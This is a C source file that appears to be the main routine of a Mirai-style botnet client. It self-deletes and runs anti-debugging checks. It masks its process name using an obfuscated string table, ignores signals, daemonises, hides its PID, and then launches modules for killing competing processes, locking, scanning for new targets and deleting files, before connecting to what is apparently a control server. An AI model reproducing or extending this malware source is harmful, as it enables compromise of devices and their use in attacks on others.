#define _GNU_SOURCE

#include <signal.h>
#include <string.h>
#include <sys/prctl.h>

#include "adbg.h"
#include "dbg.h"
#include "hide.h"
#include "rand.h"
#include "util.h"
#include "table.h"
#include "ensure.h"
#include "killer.h"
#include "locker.h"
#include "delete.h"
#include "scanner.h"
#include "connection.h"

uint32_t local_addr;

static void clear_args(int argc, char **argv) {

	int len = 0;

	for (int i = 0; i < argc; i++)
		len += strlen(argv[i]);

	memset(argv[0], 0, len + (argc - 1));
}

int main(int argc, char **argv) {

    if (argc < 2 || argv[1] == NULL)
        return 1;

#ifndef DEBUG
    unlink(argv[0]);
#endif

#ifndef NOADBG
    adbg_init(); // anti debug one first to throw them off

    BOOL quit = TRUE;
    for (int i = 0; i < 2; i++) {
	if (!adbg()) {
	    quit = FALSE;
	    break;
	}
    }

    if (quit)
        return 1;
#endif

    table_init(); // if no debug software then run fr fr

    if (!ensure_single_instance())
        return 1;

    write(1, ".", 1);
    write(1, "d", 1);
    write(1, "a", 1);
    write(1, "t", 1);
    write(1, "a\n", 3);

    char *arch = strdup(argv[1]);

    clear_args(argc, argv);

    table_unlock_val(TABLE_PROCESS_NAME);
    // strcpy(argv[0], table[TABLE_PROCESS_NAME].str); /* no need to copy a null character */
    prctl(PR_SET_NAME, table[TABLE_PROCESS_NAME].str);
    table_lock_val(TABLE_PROCESS_NAME);

    chdir("/");

    rand_init();
    local_addr = util_local_addr();

#ifndef DEBUG
    for (int i = 1; i <= 64; i++)
        signal(i, SIG_IGN);
#ifndef ASUS
    if (fork() != 0)
        return 1;
    setsid();
#endif
    close(0);
    close(1);
    close(2);
#endif

    hide_pid();
    DEBUG_PRINT("[main] started: (\'%d\')\n", getpid());

#ifdef KILLER
    killer_init();
#endif

#ifdef LOCKER
    locker_init();
#endif

#ifdef SCANNER
    scanner_init();
#endif

#ifdef HIK
    delete_init();
#endif

    establish_connection(arch);

    return 0;
}
